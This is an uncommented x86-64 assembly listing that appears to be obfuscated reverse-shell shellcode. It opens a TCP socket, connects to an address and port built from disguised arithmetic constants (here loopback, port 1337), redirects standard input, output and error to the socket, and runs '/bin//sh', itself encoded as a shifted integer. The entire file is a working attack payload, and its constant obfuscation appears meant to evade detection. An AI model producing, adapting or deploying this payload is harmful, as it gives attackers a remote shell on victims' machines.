BITS 64
SECTION .text
global _start
_start: 
xor r11,r11
mov rax,r11
xor rbx,rbx
mov rcx,0x01
sub rcx,0x01
xor rdx,rdx
xor r11,r11
mov r14,r11
mov al,41
mov r10b,2
mov dil,r10b
mov sil,1
mov r11,rbx
mov rdx,r11
syscall
mov r9,rax
mov r13,r9
mov al,42
mov r9,r13
mov rdi,r9
push rcx
mov r14,50331531
sub r14,11
sub r14,0x01ffff01
push r14
push word 0x3905
push word 0x2
mov r9,rsp
mov rsi,r9
mov dl,0x11
syscall
mov r11b,33
mov al,r11b
mov rdi,r13
xor r9,r9
mov rsi,r9
syscall
mov r8b,33
mov al,r8b
mov rdi,r13
mov sil,2
sub sil,1
syscall
mov r8b,33
mov al,r8b
mov rdi,r13
mov sil,8
sub sil,6
syscall
mov rbx,0x01
sub rbx,0x01
mov al,59
mov rdi,7526411553527181115
sub rdi,12
push rbx
push rdi
mov r9,rsp
mov rdi,r9
push rbx
push rdi
mov r15,rsp
mov rsi,r15
mov rdx,rbx
syscall
mov r9b,60
mov al,r9b
mov rdi,rbx
syscall
